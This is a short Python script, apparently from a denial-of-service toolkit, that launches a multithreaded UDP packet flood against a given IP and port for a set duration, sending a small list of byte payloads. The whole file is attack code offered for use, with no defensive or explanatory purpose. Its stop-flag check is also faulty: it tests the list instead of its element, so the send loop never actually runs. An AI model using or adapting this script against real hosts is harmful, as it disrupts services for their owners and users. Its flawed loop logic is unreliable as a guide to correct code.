# attacks/udppps.py

import socket
import time
import threading

# Array of payloads
payloads = [
    b'\x08\xb2\x00\x21',
    b'\x08\xb2\x00',
    b'\xD8\x39\x84\x00',
]

def send_udp_message(ip, port, stop_flag):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_addr = (ip, port)

    num_payloads = len(payloads)

    while not stop_flag:
        for payload in payloads:
            try:
                sock.sendto(payload, server_addr)
            except socket.error as e:
                print(f"Error sending payload: {e}")

    sock.close()

def udppps_thread(ip, port, stop_flag):
    send_udp_message(ip, port, stop_flag)

def attack(ip, port, duration, num_threads=10):
    print(f"Starting UDP PPPS flood attack on {ip}:{port} for {duration} seconds with {num_threads} threads.")

    stop_flag = [False]
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=udppps_thread, args=(ip, port, stop_flag))
        threads.append(thread)
        thread.start()

    time.sleep(duration)

    stop_flag[0] = True

    for thread in threads:
        thread.join()

    print(f"UDP PPPS flood attack finished after {duration} seconds.")
